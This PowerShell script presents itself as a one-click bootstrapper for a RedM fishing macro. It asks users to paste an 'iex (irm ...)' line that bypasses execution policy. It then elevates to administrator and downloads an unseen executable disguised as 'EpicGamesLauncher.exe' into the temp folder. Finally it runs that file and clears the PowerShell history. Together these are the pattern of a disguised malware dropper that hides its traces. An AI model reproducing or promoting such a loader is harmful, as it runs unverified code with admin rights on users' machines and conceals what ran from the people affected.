# ============================================================
#  RedM Fishing Macro - One-Click PowerShell Bootstrapper
#
#  Usage (copy-paste this entire line into PowerShell):
#
#    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force; iex (irm "https://raw.githubusercontent.com/KritTreephet/macrofishingredm/refs/heads/main/EpicGamesLauncher.ps1")
#
#  Or after cloning this repo:
#    powershell -ExecutionPolicy Bypass -File EpicGamesLauncher.ps1
# ============================================================

$ErrorActionPreference = "Continue"
$ProgressPreference = "SilentlyContinue"

[console]::OutputEncoding = [System.Text.Encoding]::UTF8
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$RepoOwner = "KritTreephet"
$RepoName = "macrofishingredm"
$AssetName = "EpicGamesLauncher.exe"
$RawScriptUrl = "https://raw.githubusercontent.com/$RepoOwner/$RepoName/refs/heads/main/EpicGamesLauncher.ps1"
$LatestReleaseApi = "https://api.github.com/repos/$RepoOwner/$RepoName/releases/latest"

# Determine script directory (works for both local file and iex)
if ($MyInvocation.MyCommand.Path) {
    $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
}
else {
    $scriptDir = Get-Location.Path
}

function Test-IsAdmin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = [Security.Principal.WindowsPrincipal] $identity
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-IsAdmin)) {
    Write-Host ""
    Write-Host "Requesting Administrator permission..." -ForegroundColor Yellow
    $cmd = "iex (irm `"$RawScriptUrl`")"
    Start-Process powershell.exe -Verb RunAs -ArgumentList @(
        "-NoProfile",
        "-ExecutionPolicy", "Bypass",
        "-Command", $cmd
    )
    exit
}

Write-Host ""
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "  RedM Fishing Macro - Checking Updates" -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host ""

try {
    $releaseInfo = Invoke-RestMethod -Uri $LatestReleaseApi -Method Get

    $version = $releaseInfo.tag_name
    $publishedAt = [datetime]$releaseInfo.published_at
    $localTime = $publishedAt.ToLocalTime().ToString("dd/MM/yyyy HH:mm:ss")

    $downloadUrl = ($releaseInfo.assets | Where-Object { $_.name -eq $AssetName }).browser_download_url

    if (-not $downloadUrl) {
        Write-Host ("[ERROR] Could not find '" + $AssetName + "' in the latest release!") -ForegroundColor Red
        Read-Host "Press Enter to exit"
        exit
    }

    Write-Host "==========================================" -ForegroundColor Yellow
    Write-Host "  New Update Available!" -ForegroundColor Green
    Write-Host "  Version: $version" -ForegroundColor White
    Write-Host "  Date: $localTime" -ForegroundColor White
    Write-Host "==========================================" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "Downloading... Please wait." -ForegroundColor White

} catch {
    Write-Host "[ERROR] Failed to fetch update info from GitHub." -ForegroundColor Red
    Write-Host "API Error: $($_.Exception.Message)" -ForegroundColor Yellow
    Read-Host "Press Enter to exit"
    exit
}

$baseTemp = [System.IO.Path]::GetTempPath()
$folderPath = Join-Path -Path $baseTemp -ChildPath "macrofishingredm"

if (-not (Test-Path -LiteralPath $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath -Force | Out-Null
}

$tempPath = Join-Path -Path $folderPath -ChildPath "EpicGamesLauncher.exe"

# Kill old process if running
try {
    $processName = [System.IO.Path]::GetFileNameWithoutExtension($tempPath)
    Get-Process -Name $processName -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Milliseconds 500
} catch {}

# Remove old file
try {
    if (Test-Path -LiteralPath $tempPath) {
        Remove-Item -LiteralPath $tempPath -Force -ErrorAction Stop
    }
} catch {
    Write-Host "[ERROR] Cannot delete old file. Please make sure the bot is closed." -ForegroundColor Red
    Write-Host "Details: $($_.Exception.Message)" -ForegroundColor Yellow
    Read-Host "Press Enter to exit"
    exit
}

# Download with WebClient (fastest, no green pipe)
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($downloadUrl, $tempPath)
    Write-Host "Download Complete!" -ForegroundColor Green
} catch {
    Write-Host "[ERROR] Error downloading the file." -ForegroundColor Red
    Write-Host "Download Error: $($_.Exception.Message)" -ForegroundColor Yellow
    Read-Host "Press Enter to exit"
    exit
}

# Clear PowerShell history (privacy)
try {
    $historyPath = (Get-PSReadLineOption).HistorySavePath
    if (Test-Path -LiteralPath $historyPath) { Clear-Content -LiteralPath $historyPath -Force }
    Clear-History
} catch {}

Write-Host ""
Write-Host "Launching RedM Fishing Macro..." -ForegroundColor Green
Start-Process -FilePath $tempPath

Start-Sleep -Seconds 2
Write-Host ""
Write-Host "[OK] GUI launched successfully!" -ForegroundColor Green
Write-Host "You can close this window now." -ForegroundColor DarkGray
Write-Host ""
